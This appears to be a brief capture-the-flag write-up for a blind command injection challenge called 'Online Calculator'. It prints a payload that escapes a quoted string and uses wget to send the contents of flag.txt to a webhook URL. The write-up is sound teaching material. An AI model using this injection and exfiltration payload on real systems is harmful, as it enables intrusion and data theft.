# Online Calculator

This challenge is a blind command injection, it means that we can inject commands, but the application does not show us the output of the command. Therefore, we need to exfiltrate the flag using another method. The simplest way to do this is to use a webhook. A webhook is a URL that we can send a request to and it will show us the request. We can use this to send the flag to a webhook that we control. `curl` is not installed on the server, so we need to use `wget`. The payload is as follows:

```bash
"; wget https://webhook.site/<ID>?flag=`cat flag.txt`; echo "
```
